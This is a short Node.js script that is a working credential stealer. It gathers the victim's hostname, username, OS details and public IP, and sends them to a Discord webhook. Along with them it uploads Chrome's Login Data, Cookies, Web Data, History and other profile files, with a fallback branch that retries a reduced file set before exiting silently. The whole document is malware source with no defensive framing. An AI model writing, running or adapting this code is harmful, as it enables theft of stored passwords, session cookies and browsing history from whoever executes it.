//Dependencies
const Discord = require("discord.js")
const Public_IP = require("public-ip")
const Os = require("os")

//Variables
const Webhook = new Discord.WebhookClient("WebhookID", "WebhookToken")

//Main
Main()
async function Main(){
    const IP = await Public_IP.v4()

    Webhook.send("```" + `OS Type: ${Os.type()}
OS Platform: ${Os.platform()}
OS Hostname: ${Os.hostname()}

OS Username: ${Os.userInfo().username}
IP: ${IP}` + "```", { files: [`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Trust Tokens`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media History`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extension Cookies`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies`] }).then(()=>{
    process.exit()
    }).catch(()=>{
        Webhook.send("```" + `OS Type: ${Os.type()}
OS Platform: ${Os.platform()}
OS Hostname: ${Os.hostname()}
        
OS Username: ${Os.userInfo().username}
IP: ${IP}` + "```", { files: [`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media History`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extension Cookies`, `C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies`] }).then(()=>{
        process.exit()
        }).catch(()=>{
            process.exit()
        })
    })
}
